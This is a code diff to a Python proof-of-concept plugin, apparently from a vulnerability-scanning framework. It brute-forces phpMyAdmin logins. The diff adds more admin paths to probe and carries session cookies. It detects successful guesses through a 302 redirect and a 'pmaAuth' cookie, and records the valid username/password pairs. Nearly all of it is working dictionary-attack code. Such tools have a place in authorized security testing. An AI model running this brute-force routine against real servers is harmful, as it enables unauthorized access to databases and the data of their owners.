@@ -26,16 +26,18 @@ class POC(Script):
     async def prove(self):
         await self.get_url()
         if self.base_url:
-            flag_list = ['src="navigation.php', 'frameborder="0" id="frame_content"', 'id="li_service_type">','class="disableAjax" title=']
+            # flag_list = ['src="navigation.php', 'frameborder="0" id="frame_content"', 'id="li_service_type">','class="disableAjax" title=']
             usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(os.path.join(paths.DICT_PATH, 'phpmyadmin_usernames.txt'))
             passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(os.path.join(paths.DICT_PATH, 'phpmyadmin_passwords.txt'))
             path_list = list(set([
                 self.url_normpath(self.base_url, '/'),
                 self.url_normpath(self.url, './phpmyadmin/'),
                 self.url_normpath(self.base_url, '/phpmyadmin/'),
-                self.url_normpath(self.url, './pmd/'),
-                self.url_normpath(self.base_url, '/pmd/'),
+                self.url_normpath(self.url, './pma/'),
+                self.url_normpath(self.base_url, '/pma/'),
                 self.url_normpath(self.url, './'),
+                self.url_normpath(self.url, './phpMyAdmin/'),
+                self.url_normpath(self.base_url, '/phpMyAdmin/'),
             ]))
             headers = {"Content-Type": "application/x-www-form-urlencoded"}
             async with ClientSession() as session:
@@ -49,21 +51,22 @@ class POC(Script):
                                     async with session.get(url=url, headers=headers) as res2:
                                         if res2:
                                             text2 = await res2.text()
+                                            cookies = res2.cookies
                                             token = re.search('name="token" value="(.*?)" />', text2)
                                             if token != None:
-                                                # token_hash = token.group(1)
                                                 token_hash = urllib.request.quote(token.group(1))
                                                 postdata = "pma_username=%s&pma_password=%s&server=1&target=index.php&lang=zh_CN&collation_connection=utf8_general_ci&token=%s" % (
                                                     username, password, token_hash)
+
                                                 async with session.post(url=url, data=postdata,
-                                                                        headers=headers) as res3:
-                                                    if res3:
-                                                        text3 = await res3.text()
-                                                        for flag in flag_list:
-                                                            if flag in text3:
+                                                                        headers=headers, cookies=cookies, allow_redirects=False) as res3:
+                                                    if res3 and res3.status == 302:
+                                                        cookies = res3.cookies
+                                                        for key,val in cookies.items():
+                                                            if 'pmaAuth' in key and val != 'deleted' :
                                                                 self.flag = 1
                                                                 self.req.append(
                                                                     {"username": username, "password": password})
                                                                 self.res.append({"info": url,
-                                                                                 "key": ":".join([username, password])})
+                                                                                 "key": "/".join([username, password])})
                                                                 return
